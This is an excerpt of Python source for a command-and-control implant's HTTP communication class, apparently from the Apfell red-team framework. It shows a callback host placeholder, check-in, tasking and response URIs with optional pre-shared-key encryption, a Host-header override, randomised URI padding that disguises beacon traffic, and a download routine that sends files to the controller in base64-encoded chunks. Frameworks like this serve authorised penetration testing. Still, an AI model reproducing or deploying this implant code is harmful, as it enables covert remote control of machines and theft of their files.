...
class C2():
    ...
    import ssl
    def __init__(self):
        self.url_base = "callback_host:callback_port"
        self.checkin_uri = "NEWCALLBACK"
        self.tasking_uri = "GETNEXTTASK"
        self.response_uri = "POSTRESPONSE"
        self.file_uri = "GETFILE"
        ...
        if self.EKE:
            ...
            self.checkin_uri = "AES_PSK_NEW_CALLBACK"
            self.encryption = True
        self.headers = {}
        if self.host_header != "":
            self.headers['Host'] = self.host_header

    def get_random_mixed(self, size):
        letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return ''.join(random.choice(letters) for i in range(size))

    def get_random_number(self, size):
        letters = "0987654321"
        return ''.join(random.choice(letters) for i in range(size))

    def get_random_alpha(self, size):
    ...
    def get_next_task_path(self, tid):
        temp = self.tasking_uri.replace(self.id_field, str(tid))
        return self.string_replace_randomizations(temp)

    def get_post_response_path(self, tid):
        temp = self.response_uri.replace(self.id_field, str(tid))
        return self.string_replace_randomizations(temp)

    def get_post_new_callback_path(self):
        temp = self.checkin_uri
        return self.string_replace_randomizations(temp)

    def get_post_new_callback_aes_psk_path(self):
        temp = self.checkin_uri.replace(self.id_field, str(apfell.UUID))
        return self.string_replace_randomizations(temp)

    def get_post_new_callback_EKE_psk_aes_path(self, ending):
        temp = self.checkin_uri.replace(self.id_field, str(ending))
        return self.string_replace_randomizations(temp)

    def string_replace_randomizations(self, string):
        # will get a string like /admin.php?q=5&page=(N4)&query=(M20)
        pieces = string.split("(")  # [/admin.php?q=5&page=, N4)&query=, M20)]
        final_string = pieces[0]
        for i in range(1, len(pieces)):
            arg_split = pieces[i].split(")")  # [N4, &query=] and [M20,'']
            config = arg_split[0]  # N4 and M20
            size = int(config[1:])
            if config[0] == "N":
                final_string += self.get_random_number(size)
            elif config[0] == "M":
                final_string += self.get_random_mixed(size)
            elif config[0] == "A":
                final_string += self.get_random_alpha(size)
    ...
    def download(self, task_id=-1, data=""):
        ...
        for x in range(chunks):
            ...
            self.post_response(response=self.json.dumps({"chunk_num": x+1, "file_id": file_id, "chunk_data": self.base64.b64encode(chunk).decode('utf-8')}), task_id=task_id)
